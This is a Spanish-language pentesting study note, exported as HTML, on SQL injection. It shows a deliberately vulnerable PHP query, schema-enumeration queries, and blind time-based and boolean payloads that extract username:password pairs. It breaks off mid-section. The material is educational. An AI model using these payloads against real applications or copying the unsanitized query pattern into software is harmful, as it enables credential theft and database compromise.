<!DOCTYPE html> <html><head>
		<title>SQLI - (Inyecciones SQL)</title>
		<base href="..\..\..\..\..\..\..\../">
		<meta id="root-path" root-path="..\..\..\..\..\..\..\../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="Hacking - SQLI - (Inyecciones SQL)">
		<meta property="og:title" content="SQLI - (Inyecciones SQL)">
		<meta property="og:description" content="Hacking - SQLI - (Inyecciones SQL)">
		<meta property="og:type" content="website">
		<meta property="og:url" content="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotaciÃ³n/vulnerabilidades/sqli-(inyecciones-sql).html">
		<meta property="og:image" content="undefined">
		<meta property="og:site_name" content="Hacking">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="SQLI - (Inyecciones SQL)"><p>SQLI - (Inyecciones SQL)</p></h1><div><hr></div><div><ul>
<li data-line="0">Tags: <a href="?query=tag:basico" class="tag" target="_blank" rel="noopener">#basico</a> <a href="?query=tag:ataque" class="tag" target="_blank" rel="noopener">#ataque</a> <a href="?query=tag:sql" class="tag" target="_blank" rel="noopener">#sql</a> <a href="?query=tag:practica" class="tag" target="_blank" rel="noopener">#practica</a> </li>
</ul></div><div><hr></div><div><ul>
<li data-line="0">
<h1 data-heading="Â¿ Que es SQL ?" class="heading" id="Â¿_Que_es_SQL_?">Â¿ Que es SQL ?</h1>
<a data-href="SQL" href="notes/5.-tecnologÃ­as/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener">SQL</a> es un lenguaje de programaciÃ³n, sus siglas <strong>Structured Query Language</strong>. Consiste en un lenguaje de administraciÃ³n y recuperaciÃ³n de datos alojados en <em>Base de datos</em>.</li>
</ul></div><div><hr></div><div><ul>
<li data-line="0">
<h1 data-heading="Â¿ Que es una InjecciÃ³n SQL ?" class="heading" id="Â¿_Que_es_una_InjecciÃ³n_SQL_?">Â¿ Que es una InjecciÃ³n SQL ?</h1>
Una <strong>SQLI</strong> (<strong>SQL</strong> <strong>I</strong>njection) es una tÃ©cnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que <strong>no validan adecuadamente</strong> la entrada del usuario en la consulta <a data-href="SQL" href="notes/5.-tecnologÃ­as/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener">SQL</a> que se envÃ­a a la base de datos. Los atacantes pueden utilizar esta tÃ©cnica para ejecutar consultas <a data-href="SQL" href="notes/5.-tecnologÃ­as/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener">SQL</a> maliciosas y <strong>obtener informaciÃ³n confidencial</strong> como nombres de usuarios, contraseÃ±as y otra informaciÃ³n almacenada en la base de datos. </li>
</ul></div><div><hr></div><div><ul>
<li data-line="0">
<h1 data-heading="Â¿ Como se produce ?" class="heading" id="Â¿_Como_se_produce_?">Â¿ Como se produce ?</h1>
</li>
</ul></div><div><p>Como se meciono anteriormente una <strong>SQLI</strong> se produce cuando un atacante inserta cÃ³digo <a data-href="SQL" href="notes/5.-tecnologÃ­as/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener">SQL</a> malicioso en los campos de entrada de una aplicaciÃ³n web. Si la aplicaciÃ³n no valida adecuadamente la entrada del usuario, la consulta <a data-href="SQL" href="notes/5.-tecnologÃ­as/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener">SQL</a> maliciosa se ejecutarÃ¡ en la base de datos, lo que permitirÃ¡ al atacante obtener informaciÃ³n confidencial o incluso controlar la base de datos. </p></div><div class="heading-wrapper"><h4 data-heading="Para usar a modo de ejemplo, utilizaremos el sig archivo de php para suponer un ejemplo de un caso de como podria estar estructurado el codigo en php para que estas **SQLI** se ocacionen." class="heading" id="Para_usar_a_modo_de_ejemplo,_utilizaremos_el_sig_archivo_de_php_para_suponer_un_ejemplo_de_un_caso_de_como_podria_estar_estructurado_el_codigo_en_php_para_que_estas_**SQLI**_se_ocacionen."><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Para usar a modo de ejemplo, utilizaremos el sig archivo de php para suponer un ejemplo de un caso de como podria estar estructurado el codigo en php para que estas <strong>SQLI</strong> se ocacionen.</h4><div class="heading-children"><div><pre class="language-php" tabindex="0"><code class="language-php is-loaded"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token variable">$host</span><span class="token operator">=</span><span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">;</span>
	<span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>
	<span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">;</span>
	<span class="token variable">$database</span><span class="token operator">=</span><span class="token string single-quoted-string">'database'</span><span class="token punctuation">;</span>
	<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
	<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"SELECT username FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>' "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token variable">$response</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token variable">$response</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>En este ejemplo utilizamos un simple archivo de php el cual tiene las credenciales, el host y la base de dato a  usar, posteriormente de realizar la conexiÃ³n lee el input del usuario y ejecuta una query de <a data-href="SQL" href="notes/5.-tecnologÃ­as/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener">SQL</a> <strong>sin sanitizaciÃ³n</strong> alguna, para posteriormente imprimir en el navegador el nombre del usuario. Esto es lo que podria ocacionar la <strong>SQLI</strong>, el hecho de que se lea la query 'id' y se confie en esta...</p></div><div><hr></div></div></div><div class="heading-wrapper"><h2 data-heading="Importante!" class="heading" id="Importante!"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Importante!</h2><div class="heading-children"><div><p>Es importante entender que el objetivo de toda <strong>SQLI</strong>, como se menciono anteriormente, es <strong>dumpear datos</strong> de una <strong>base de datos</strong>, como sabemos, en <a data-href="SQL" href="notes/5.-tecnologÃ­as/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener">SQL</a> las base de datos son tablas, que contienen columnas y registros, por lo que para poder llevar a cabo cualquier <strong>SQLI</strong> vista a continuaciÃ³n es importante saber las base de datos, las tablas y las columnas de lo que querramos dumpear, por lo que, usando <em>MySQL</em> a continuaciÃ³n se explica como obtener esto: </p></div><div><p><strong>!ACLARACIÃN!</strong> No en todos los gestores de SQL las querys de ejemplo funcionaran, ya que estos tienen algunos leves cambios, pero aquellos cambios mÃ¡s relevantes para los distintos gestores se pueden ver en esta <a data-tooltip-position="top" aria-label="https://portswigger.net/web-security/sql-injection/cheat-sheet" rel="noopener" class="external-link" href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank">cheat sheat</a></p></div><div><ul>
<li data-line="0">
<h4 data-heading="Dumpeo de **Base de datos**:" class="heading" id="Dumpeo_de_**Base_de_datos**:">Dumpeo de <strong>Base de datos</strong>:</h4>
</li>
</ul></div><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token keyword">SELECT</span> schema_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><ul>
<li data-line="0">
<h4 data-heading="Dumpeo de **Tablas** para una Base de datos especifica:" class="heading" id="Dumpeo_de_**Tablas**_para_una_Base_de_datos_especifica:">Dumpeo de <strong>Tablas</strong> para una Base de datos especifica:</h4>
</li>
</ul></div><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token string">'db_name'</span><span class="token punctuation">;</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><ul>
<li data-line="0">
<h4 data-heading="Dumpeo de **Columnas** para una tabla especifica de una base de datos especifica:" class="heading" id="Dumpeo_de_**Columnas**_para_una_tabla_especifica_de_una_base_de_datos_especifica:">Dumpeo de <strong>Columnas</strong> para una tabla especifica de una base de datos especifica:</h4>
</li>
</ul></div><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token keyword">SELECT</span> column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token string">'db_name'</span> <span class="token operator">AND</span> table_name<span class="token operator">=</span><span class="token string">'table_name'</span><span class="token punctuation">;</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p> Ahora si.... Existen varios tipos de <strong>SQLI</strong>.</p></div><div><hr></div><div><ul>
<li data-line="0">
<h1 data-heading="InyecciÃ³n SQL basada en errores:" class="heading" id="InyecciÃ³n_SQL_basada_en_errores:">InyecciÃ³n SQL basada en errores:</h1>
<p>Este tipo de <strong>SQLI</strong> aprovecha <strong>errores en el cÃ³digo SQL</strong> para obtener informaciÃ³n. Por ejemplo, si la consulta  devuelve un error con un mensaje especÃ­fico, se puede utilizar ese mensaje para obtener informaciÃ³n adicional del sistema. </p>
</li>
<li data-line="3">
<h3 data-heading="Ejemplo:" class="heading" id="Ejemplo:">Ejemplo:</h3>
</li>
</ul></div><div><p>Supongamos que el script anterior en lugar de tener la lÃ­nea del <code>echo $response['username'];</code> la cual simplemente imprime en el navegador el nombre del usuario, es una lÃ­nea que tiene una condiciÃ³n de que en caso de que la query no haya devuelto nada arroja 404 y de lo contrario realiza otra x acciÃ³n </p></div><div><pre class="language-php" tabindex="0"><code class="language-php is-loaded"><span class="token comment"># SCRIP ANTERIOR </span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'useranme'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>De esta manera, si en la query ingresamos un "1", devuelve 200 ya que el usuario existe pero no realiza nada mÃ¡s que eso la web, bueno...  abusando de este status code 404 en caso de que sea  false y 200 en caso de que sea true se pueden realizar <strong>SQLI</strong> basadas en <strong>tiempo</strong>, basadas en <strong>booleanos</strong>, basadas en <strong>uniones</strong> y basadas en <strong>stacked queries</strong>.</p></div><div><p>Y como complejisaciÃ³n adicional, la lÃ­nea de <code>$id = $_GET['id']</code> , ahora continene una sanitizaciÃ³n la cual al ingresar caracteres especiales estos se escapan, siendo imposible asi ingresar comillas y demÃ¡s. </p></div><div><pre class="language-php" tabindex="0"><code class="language-php is-loaded"><span class="token comment"># SCRIP ANTERIOR</span>
<span class="token comment"># VIEJA LINEA: </span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment"># NUEVA LINEA: </span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Por ultimo, tomemos el ejemplo en donde el usuario a su vez, en la lÃ­nea de la query <code>SELECT username FROM users WHERE user_id='$id'</code> ahora no el user_id=$id <strong>NO</strong> tiene comillas, de esta manera por un nuevo error, el sistema sigue siendo vulnerable a <strong>SQLI</strong> pero de una manera un poco mÃ¡s compleja.</p></div><div><hr></div><div><ul>
<li data-line="0">
<h1 data-heading="InyecciÃ³n SQL basada en tiempo:" class="heading" id="InyecciÃ³n_SQL_basada_en_tiempo:">InyecciÃ³n SQL basada en tiempo:</h1>
Este tipo de <strong>SQLI</strong> utiliza una consulta que <strong>tarda un determinado tiempo en ejecutarse</strong> para obtener informaciÃ³n. Por ejemplo, si se utiliza una consulta que realiza una bÃºesqueda en una tabla y se aÃ±ade un retado en la consulta, se puede uitilizar ese retardo para obtener informaciÃ³n adicional. </li>
</ul></div><div><p>Ejemplo con caso anterior: </p></div><div class="heading-wrapper"><h4 data-heading="Original QUERY:" class="heading" id="Original_QUERY:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Original QUERY:</h4><div class="heading-children"><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token string">'%d'</span>
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h4 data-heading="SQLI basada en tiempo:" class="heading" id="SQLI_basada_en_tiempo:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>SQLI basada en tiempo:</h4><div class="heading-children"><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token comment">-- Supongamos que realizamos la prubea de ingresar el usuario 1 y devuelve 200 OK  </span>
<span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token number">1</span> 
<span class="token comment">-- Ahora ingresamos el usuario 1241 y devuelve 404</span>
<span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token number">1241</span>
<span class="token comment">-- Ahora jugamos con el tiempo para corroborar si la peticiÃ³n devuelve 200 OK a los 5s de ejecutarla (Indicando asi, que es TRUE)</span>
<span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token number">1241</span> <span class="token operator">OR</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">97</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Con esta QUERY maliciosa <code>OR if(ascii(substr((select group_concat(name,0x3a,password) from users),1,1))=97,sleep(5),1)</code> estamos abusando de que el usuario 1241 no existe para verificar si esta sentencia se cumple, pidiendo que si el codigo ascii del primer caracter del conjunto de valores de "name" + 0x3a (":") + "password" es igual a 97 (Letra 'a' en codigo ascii), hagamos que la pÃ¡gina tarde en responder 5s (sleep(5)), de lo contrario devolvemos solo un 200 OK.</p></div><div><hr></div><div><ul>
<li data-line="0">
<h1 data-heading="InyecciÃ³n SQL basada en booleanos:" class="heading" id="InyecciÃ³n_SQL_basada_en_booleanos:">InyecciÃ³n SQL basada en booleanos:</h1>
Este tipo de <strong>SQLI</strong> utiliza consultas con <strong>expresiones booleanas</strong> para obtener informaciÃ³n adicioanl. Por ejemplo, se puede utilizar una consulta con una expresiÃ³n booleana para determinar si un usuario existe en una base de datos.</li>
</ul></div></div></div><div class="heading-wrapper"><h4 data-heading="Original QUERY:" class="heading" id="Original_QUERY:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Original QUERY:</h4><div class="heading-children"><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token string">'%d'</span>
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="heading-wrapper"><h4 data-heading="SQLI basa en tiempo:" class="heading" id="SQLI_basa_en_tiempo:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>SQLI basa en tiempo:</h4><div class="heading-children"><div><pre class="language-sql" tabindex="0"><code class="language-sql is-loaded"><span class="token comment">-- Supongamos que realizamos la prubea de ingresar el usuario 1 y devuelve 200 OK  </span>
<span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token number">1</span> 
<span class="token comment">-- Ahora ingresamos el usuario 1241 y devuelve 404</span>
<span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token number">1241</span>
<span class="token comment">-- Ahora jugamos con el booleano, ya que sabemos que la primea peticiÃ³n no se cumple si se cumple la 2da podriamos ir deduciendo los datos</span>
<span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token number">1241</span> <span class="token operator">OR</span> <span class="token punctuation">(</span><span class="token keyword">select</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">97</span><span class="token punctuation">)</span>
